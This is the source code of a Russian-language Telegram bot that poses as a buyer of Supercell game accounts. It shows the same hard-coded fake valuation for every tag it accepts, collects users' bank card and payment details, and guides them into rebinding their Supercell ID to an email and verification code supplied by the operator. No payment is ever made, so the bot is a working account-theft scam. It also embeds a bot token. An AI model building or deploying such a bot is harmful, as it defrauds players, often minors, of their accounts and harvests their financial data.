import logging
import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State

# Настройка логов
logging.basicConfig(level=logging.INFO)

# ─── КОНФИГУРАЦИЯ С ДАННЫМИ ПОЛЬЗОВАТЕЛЯ ───
BOT_TOKEN = "8910516017:AAGh-AVUIDnQGMTUshRSq7A59lpZgWpD-f8"
ADMIN_ID = 8266829782

# Пути к файлам (картинки должны лежать в одной папке с файлом bot.py)
PHOTO_BS = "IMG_7382.jpeg"   # Brawl Stars
PHOTO_CR = "IMG_7381.jpeg"   # Clash Royale
PHOTO_COC = "IMG_7383.jpeg"  # Clash of Clans

# Ссылка на видео-инструкцию (замени на свою рабочую ссылку)
VIDEO_INSTRUCTION = "https://link-to-video.com/instruction.mp4"
# ───────────────────────────────────────────

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Состояния FSM
class OrderState(StatesGroup):
    choosing_game = State()
    entering_tag = State()
    entering_requisites = State()
    waiting_for_transfer = State()

# Главное меню
def get_games_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🌵 Brawl Stars", callback_query_data="game_bs")],
        [InlineKeyboardButton(text="👑 Clash Royale", callback_query_data="game_cr")],
        [InlineKeyboardButton(text="⚔️ Clash of Clans", callback_query_data="game_coc")]
    ])

# Команда /start
@dp.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    text = (
        "✨ Добро пожаловать в крупнейшего бота по скупке в играх Supercell!\n\n"
        "🎉 Здесь твои игровые достижения превращаются в реальные деньги. Мы обеспечиваем "
        "быстрые выплаты и полную гарантию и защиту для каждой сделки проведённой в нашем сервисе\n\n"
        "💎 Аккаунт какой игры ты хочешь продать по лучшей цене?"
    )
    await message.answer(text, reply_markup=get_games_keyboard())

# Выбор игры
@dp.callback_query(F.data.startswith("game_"))
async def choose_game(callback: CallbackQuery, state: FSMContext):
    game = callback.data.split("_")[1]
    await state.update_data(chosen_game=game)
    
    await callback.message.delete()
    
    try:
        if game == "bs":
            photo = FSInputFile(PHOTO_BS)
            await bot.send_photo(callback.from_user.id, photo=photo, caption="🧿 Укажите свой тег из Brawl Stars (Пример: 2C9CPP2900 ):")
        elif game == "cr":
            photo = FSInputFile(PHOTO_CR)
            await bot.send_photo(callback.from_user.id, photo=photo, caption="🖥 Укажите свой тег из Clash Royale (Пример: VPPLVJ9J8 ):")
        elif game == "coc":
            photo = FSInputFile(PHOTO_COC)
            await bot.send_photo(callback.from_user.id, photo=photo, caption="✔️Укажите свой тег из Clash of Clans (Пример: YGCJ2800U ):")
    except Exception as e:
        logging.error(f"Ошибка отправки фото: {e}")
        await bot.send_message(callback.from_user.id, text="⚠️ Ошибка: Проверьте, что файлы картинок лежат в папке с ботом.")
        
    await state.set_state(OrderState.entering_tag)
    await callback.answer()

# Обработка тега и расчет стоимости
@dp.message(OrderState.entering_tag)
async def process_tag(message: Message, state: FSMContext):
    tag = message.text.strip().upper()
    
    # Валидация корректности тега
    if len(tag) < 5 or any(c in tag for c in ['@', '.', '/', ' ']):
        await message.answer("Ошибка тега неправильный тег")
        return

    user_data = await state.get_data()
    game = user_data.get("chosen_game")
    
    response_text = ""
    
    if game == "bs":
        response_text = (
            "😀 Кубков на аккаунте: 34511 😀\n\n"
            "🪨 Бравлеров с максимальной силой : 24\n\n"
            "🌏Бравлеров от 1к до 2к: 14\n\n"
            "🌑Бравлеров от 2к до 3к: 1\n\n"
            "☄Бравлеров от 3к: 0\n\n\n"
            "⭐️ Звездных сил : 56\n"
            "😀 Гаджетов : 86\n"
            "⚡️ Гиперзарядов: 39 \n\n"
            "😀 Всего бравлеров: 84\n\n"
            "😀 Мы готовы выкупить его у тебя за : 2430 ₽\n"
            "💱 Примерно по курсу (RUB→):\n"
            "• AZN (Азербайджанский манат): ~56.98\n"
            "• AMD (Армянский драм): ~12 347\n"
            "• BYN (Белорусский рубль): ~92.75\n"
            "• KZT (Казахстанский тенге): ~16 405.42\n"
            "• KGS (Киргизский сом): ~2 932.77\n"
            "• MDL (Молдавский лей): ~583.59\n"
            "• TJS (Таджикский сомони): ~312.21\n"
            "• UZS (Узбекский сум): ~402 044"
        )
    elif game == "cr":
        response_text = (
            "🖥 Укажите свой тег из Clash Royale (Пример: VPPLVJ9J8 ):\n"
            "😀 Кубков: 6160\n"
            "😀 Эволюционных карт: 5\n"
            "⚔️ Героев: 0\n"
            "───────────────\n"
            "🛡 0 карт уровня 16\n"
            "🛡 0 карт уровня 15\n"
            "🛡 1 карт уровня 14\n"
            "🛡 1 карт уровня 13\n"
            "🛡 0 карт уровня 12\n"
            "🛡 5 карт уровня 11\n"
            "───────────────\n"
            "💵 Мы готовы выкупить аккаунт за: 2700 ₽\n"
            "💱 Примерно по курсу (RUB→):\n"
            "• AZN (Азербайджанский манат): ~63.42\n"
            "• AMD (Армянский драм): ~13 744\n"
            "• BYN (Белорусский рубль): ~103.22\n"
            "• KZT (Казахстанский тенге): ~18 238.5\n"
            "• KGS (Киргизский сом): ~3 264.3\n"
            "• MDL (Молдавский лей): ~649.05\n"
            "• TJS (Таджикский сомони): ~347.52\n"
            "• UZS (Узбекский сум): ~448 011"
        )
    elif game == "coc":
        response_text = (
            "🏠 Уровень Ратуши: 13\n"
            "🏆 Кубки: 0\n"
            "👷‍♂️ Ратуша Строителя: 4\n\n"
            "💰 Мы готовы выкупить его у тебя за: 1900 ₽\n"
            "💱 Примерно по курсу (RUB→):\n"
            "• AZN (Азербайджанский манат): ~44.55\n"
            "• AMD (Армянский драм): ~9 654\n"
            "• BYN (Белорусский рубль): ~72.52\n"
            "• KZT (Казахстанский тенге): ~12 827.28\n"
            "• KGS (Киргизский сом): ~2 293.11\n"
            "• MDL (Молдавский лей): ~456.3\n"
            "• TJS (Таджикский сомони): ~244.11\n"
            "• UZS (Узбекский сум): ~314 355\n\n"
            "📊 Детализация:\n"
            "• Базовая цена (ратуша): 1500 ₽\n"
            "• Бонусы:\n"
            "  ⚔️ Оружие ратуши (Уровень 1): +50 ₽\n"
            "  👑 Герои (средний уровень 29.6%): +110 ₽\n"
            "     • Barbarian King 30/105 (28.6%) → +20 ₽\n"
            "     • Archer Queen 38/105 (36.2%) → +50 ₽\n"
            "     • Grand Warden 20/80 (25.0%) → +20 ₽\n"
            "     • Minion Prince 26/95 (27.4%) → +20 ₽\n"
            "  🎒 Экипировка героев: +140 ₽\n"
            "     • Vampstache 12/18 (66.7%) → +30 ₽\n"
            "     • Rage Vial 6/18 (33.3%) → +15 ₽\n"
            "     • Invisibility Vial 5/18 (27.8%) → +15 ₽\n"
            "     • Eternal Tome 5/18 (27.8%) → +15 ₽\n"
            "     • Life Gem 5/18 (27.8%) → +15 ₽\n"
            "     ... и еще 8 экипировок\n"
            "  ⚔️ Войска (39 шт., 0 макс., средний 25.6%): +50 ₽\n"
            "  ✨ Заклинания (11 шт., 0 макс., средний 41.1%): +50 ₽\n\n"
            "💵 Итого: 1900 ₽"
        )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💵 Продать", callback_query_data="sell_account")]
    ])
    await message.answer(response_text, reply_markup=kb)

# Шаг ввода реквизитов
@dp.callback_query(F.data == "sell_account")
async def sell_account(callback: CallbackQuery, state: FSMContext):
    text = (
        "🔖 Отправьте нам свои платежные реквизиты!\n\n"
        "➡️ Пожалуйста, укажите информацию в следующем формате:\n\n"
        "📌 Название платежной системы/банка - реквизиты \n\n"
        "⬇️ Пример:\n\n"
        "😀 Visa/MasterCard/Мир – 1234 5678 9012 3456\n"
        "😀 СБП - +7777777777 ВТБ\n"
        "😀 Kaspi Bank – 4400 1234 5678 9012\n"
        "😀 Беларусбанк   – 9112 1234 5678 9012\n"
        "😀 Uzcard - 4400 1234 5678 9012\n"
        "😀 Ориёнбонк - 4400 1234 5678 9012\n\n"
        "⭐️ Звезды - @username (курс: 1 звезда - 1.5₽)\n"
        "🎮 Голда (Standoff 2) - ваш ID в игре (курс: 1 рубль - 5 голды)\n"
        "🎮 UC PUBG Mobile - ваш ID в игре (курс 1 рубль - 0.7 UC )\n"
        "🎮 Robux (Roblox)  - ваш ID в игре (курс 1 рубль - 2 Robux )"
    )
    await callback.message.answer(text)
    await state.set_state(OrderState.entering_requisites)
    await callback.answer()

# Принятие реквизитов и вывод инструкции перепривязки
@dp.message(OrderState.entering_requisites)
async def process_requisites(message: Message, state: FSMContext):
    reqs = message.text
    
    # 1 сообщение
    await message.answer(f"😀 Ваши реквизиты '{reqs}' сохранены !\n📱 Деньги поступят сразу после продажи! 💵😀")
    
    # 2 сообщение (Видео)
    try:
        await message.answer_video(video=VIDEO_INSTRUCTION, caption="📹 Инструкция по перепривязке аккаунта")
    except Exception:
        await message.answer("📹 (Здесь должна быть видеоинструкция по смене почты)")

    # 3 сообщение
    manager_text = (
        "🙂Уважаемый клиент, я выступаю в роли вашего персонального менеджера. "
        "Ниже представлена инструкция по выполнению перепривязки учетной записи после получения электронного письма:\n\n"
        "1. Войдите в игре и перейдите в раздел «Supercell ID».\n"
        "2. Нажмите кнопку «Сменить почту».\n"
        "3. Введите в игре код, полученный на вашу электронную почту.\n"
        "4. Введите новый адрес электронной почты (для генерации нажмите генерировать ).\n"
        "5. Система запросит код с новой почты; его можно получить, нажав кнопку «Получить код».\n\n"
        "⚡️ После успешной перепривязки войдите в бота и нажмите кнопку «Аккаунт перепривязан». "
        "Средства будут зачислены в течение 5–15 минут после отправки подтверждающего видео. Благодарим вас за доверие."
    )
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📧 Генерировать почту", callback_query_data="gen_email")]
    ])
    
    await message.answer(manager_text, reply_markup=kb)
    await state.set_state(OrderState.waiting_for_transfer)

# Запрос почты админу
@dp.callback_query(F.data == "gen_email")
async def gen_email_click(callback: CallbackQuery):
    await bot.send_message(
        chat_id=ADMIN_ID,
        text=f"⚠️ Юзеру @{callback.from_user.username} (ID: {callback.from_user.id}) **нужна почта**.\n"
             f"Сделайте REPLY (Ответить) на это сообщение и напишите почту."
    )
    await callback.message.answer("⏳ Запрос отправлен менеджеру. Пожалуйста, ожидайте генерации почты...")
    await callback.answer()

# Запрос кода админу
@dp.callback_query(F.data == "get_code")
async def get_code_click(callback: CallbackQuery):
    await bot.send_message(
        chat_id=ADMIN_ID,
        text=f"🔑 Юзеру @{callback.from_user.username} (ID: {callback.from_user.id}) **нужен код**.\n"
             f"Сделайте REPLY (Ответить) на это сообщение и напишите код из письма."
    )
    await callback.message.answer("⏳ Запрос кода отправлен менеджеру. Ожидайте...")
    await callback.answer()

# Юзер завершил сделку
@dp.callback_query(F.data == "acc_linked")
async def acc_linked_click(callback: CallbackQuery):
    await callback.message.answer("✅ Отлично! Отправьте подтверждающее видео в этот чат. Средства будут зачислены на ваши реквизиты в течение 5–15 минут.")
    await bot.send_message(ADMIN_ID, text=f"🎉 Юзер {callback.from_user.id} подтвердил перепривязку. Ждем от него видео.")
    await callback.answer()


# ─── АДМИН-ПАНЕЛЬ: ПЕРЕСЫЛКА ЮЗЕРУ ЧЕРЕЗ REPLY ───

@dp.message(F.chat.id == ADMIN_ID, F.reply_to_message)
async def handle_admin_reply(message: Message):
    reply_text = message.reply_to_message.text
    
    try:
        user_id = int(reply_text.split("(ID: ")[1].split(")")[0])
    except (IndexError, ValueError):
        await message.answer("❌ Ошибка: не могу определить ID юзера из сообщения.")
        return

    # Ответ админа на запрос почты
    if "нужна почта" in reply_text:
        email = message.text
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📩 Получить код", callback_query_data="get_code")]
        ])
        await bot.send_message(
            chat_id=user_id,
            text=f"📧 Электронная почта для привязки аккаунта:\n\n`{email}`\n\nВведи её в игре и нажми кнопку ниже, чтобы запросить код подтверждения.",
            parse_mode="Markdown",
            reply_markup=kb
        )
        await message.answer("✅ Почта успешно отправлена клиенту.")

    # Ответ админа на запрос кода
    elif "нужен код" in reply_text:
        code = message.text
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⚡️ Аккаунт перепривязан", callback_query_data="acc_linked")]
        ])
        await bot.send_message(
            chat_id=user_id,
            text=f"🔑 Ваш код подтверждения:\n\n`{code}`\n\nВведите его в поле подтверждения Supercell ID.",
            parse_mode="Markdown",
            reply_markup=kb
        )
        await message.answer("✅ Код успешно переслан клиенту.")

# Старт
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
